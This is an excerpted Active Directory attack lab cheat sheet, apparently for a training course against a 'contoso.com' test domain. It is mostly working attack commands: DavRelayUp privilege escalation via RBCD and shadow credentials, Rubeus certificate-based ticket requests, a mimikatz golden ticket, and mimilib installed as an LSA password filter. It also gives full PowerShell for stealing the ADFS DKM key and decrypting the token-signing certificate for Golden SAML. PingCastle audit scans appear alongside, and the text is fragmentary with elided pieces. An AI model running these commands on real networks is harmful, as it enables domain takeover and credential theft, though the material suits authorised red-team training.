...
sudo apt install git chromium iptables rdesktop -y
sudo apt install crackmapexec netexec python3-pip python3-virtualenv -y
...
Check any ephemeral port from the previous `nmap` scan:

```bash
~/env-impacket/bin/rpcdump.py contoso-dc | grep -B 20 49671
```
...
```bash
nmap --script broadcast-listener --script-args "broadcast-listener.timeout=30"
```
...
```batchfile
\\local\GOC213\PingCastle_3.3.0.1\pingcastle.exe --scanner smb --server contoso.com --scmode-all
```
...
```batchfile
\\local\GOC213\PingCastle_3.3.0.1\pingcastle.exe --scanner share --server contoso.com --scmode-all
```
...
```batchfile
\\local\GOC213\PingCastle_3.3.0.1\pingcastle.exe --scanner computerversion --server contoso.com --scmode-all
...
```batchfile
copy \\local\GOC213\DavRelayUp2.exe %temp% /y
%temp%\DavRelayUp2.exe full --Method rbcd --CreateNewComputerAccount --ComputerName CONTOSO-PC4 --ComputerPassword "Password123" --Impersonate Admin --Port 55555 --Verbose
```

### DavRelayUp w/ Shadow Credentials
...
```batchfile
copy \\local\GOC213\DavRelayUp2.exe %temp% /y
%temp%\DavRelayUp2.exe full --Method shadowcred --ForceShadowCred --Impersonate Admin --Port 55555 --Verbose
```
...
# Catch ADWS traffic
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 9389 -j REDIRECT --to-port 9389
...
```powershell
Get-ADUser -Filter * -Server CONTOSO-DC
```
...
```batchfile
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:CONTOSO-DC2$ /ptt /getcredentials /enctype:AES256 /certificate:"\\local\Loot\CONTOSO-DC2$.pfx"
```
...
```batchfile
kerberos::golden /ptt /user:Admin /domain:contoso.com /aes256:20fb0621396b3cd32efa2d0edf39487658bc0619cc609c0029a23aa795afd14e /service:krbtgt /startoffset:0 /endin:600 /renewmax:10080 /sid:S-1-5-21-2474978765-2619710211-1762062286 /id:1000 /groups:512,518,519,520 /sids:S-1-5-21-938793711-3613651074-186196483-1102
```
...
Get-ADDBServiceAccount -DatabasePath 'E:\GOC213\Loot\ADBackup\Active Directory\ntds.dit' -EffectiveTime (Get-Date)
```
...
```batchfile
copy "\\local\goc213\mimikatz\x64\mimilib.dll" "%windir%\system32\"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /d "mimilib;rassfm;scecli" /s ";" /t REG_MULTI_SZ /f
shutdown /r /t 5
```

```powershell
Set-ADAccountPassword -Identity simmons -NewPassword (ConvertTo-SecureString -String 'Pa$$w0rd' -AsPlainText -Force) -Reset
Get-Content -Path "$env:windir\system32\kiwifilter.log"
```

### Golden SAML

#### Stealing DKM Key from AD
...
```powershell
$dkmObject = Get-ADObject -SearchBase 'CN=ADFS,CN=Microsoft,CN=Program Data,DC=contoso,DC=com' -LDAPFilter '(thumbnailPhoto=*)' -Properties thumbnailPhoto |
    Select-Object -Last 1
[System.BitConverter]::ToString($dkmObject.thumbnailPhoto)
```

#### Stealing Encrypted Certificates from SQL Server

| Computer | User | Password |
|-|-|-|
| CONTOSO-ADFS | CONTOSO\Admin | Pa$$w0rd |

```powershell
[string] $connectionString = 'Data Source=np:\\.\pipe\microsoft##wid\tsql\query;Integrated Security=True'
$connection = [System.Data.SqlClient.SqlConnection]::new($connectionString)
$connection.Open()
$query = $connection.CreateCommand()
$query.CommandText = 'SELECT ServiceSettingsData FROM AdfsConfigurationV4.IdentityServerPolicy.ServiceSettings'
$adfsSettings = $query.ExecuteScalar()
$connection.Close()
([xml]$adfsSettings).ServiceSettingsData.SecurityTokenService.SigningToken.EncryptedPfx
```

#### Decrypting the Token Signing Certificate
...
```powershell
# TODO: Replace the following 2 values:
[string] $dkmKeyString = 'C5-14-C3-49-B0-6A-39-86-B6-74-1A-B9-BD-73-3B-36-43-EC-AB-CB-20-5A-6F-F8-59-80-49-7A-CB-EE-6E-19'
[string] $encryptedPfxString = ''
[string] $filePath = 'adfs-signing.pfx'

# Decode input
[byte[]] $dkmKey = [System.Runtime.Remoting.Metadata.W3cXsd2001.SoapHexBinary]::Parse($dkmKeyString -replace '-').Value
[byte[]] $encryptedPfx = [System.Convert]::FromBase64String($encryptedPfxString)

# Parse AES data
[byte[]] $macOid = $encryptedPfx[37..47]
[byte[]] $encryptionOid = $encryptedPfx[48..58]
[byte[]] $nonce = $encryptedPfx[59..92]
[byte[]] $iv = $encryptedPfx[93..110]
[byte[]] $ciphertext = $encryptedPfx[115..$($encryptedPfx.Length-33)]

# Derive decryption key
$hmac = [System.Security.Cryptography.HMACSHA256]::new($dkmKey)
$hmacOutput = $hmac.ComputeHash(@(0x00,0x00,0x00,0x01) + $encryptionOid + $macOid + @(0x00) + $nonce[2..33] + @(0x00,0x00,0x00,
0x30))
$hmac.Dispose()
$hmac.d
[byte[]] $decryptionKey = $hmacOutput[0..15]
...
# Decrypt and save the PFX file
$pfxFile = [System.IO.FileStream]::new($filePath, [System.IO.FileMode]::Create)
$cryptoStream = [System.Security.Cryptography.CryptoStream]::new($pfxFile, $aesDecryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
...
# Test the PFX file
[string]::Empty | certutil -dump $filePath
```

SAML Token Generation: [ADFSpoof](https://github.com/mandiant/ADFSpoof)
...
```batchfile
\\local\GOC213\PingCastle_3.3.0.1\pingcastle.exe --healthcheck --server contoso.com --user CONTOSO\bfu --password "Pa$$w0rd" --protocol LDAPOnly --quota 10 --level Full --no-enum-limit --explore-trust --explore-forest-trust
```

```batchfile
\\local\GOC213\PingCastle_3.3.0.1\pingcastle.exe --carto
```

```batchfile
\\local\GOC213\PingCastle_3.3.0.1\pingcastle.exe --scanner spooler --server contoso.com --scmode-dc
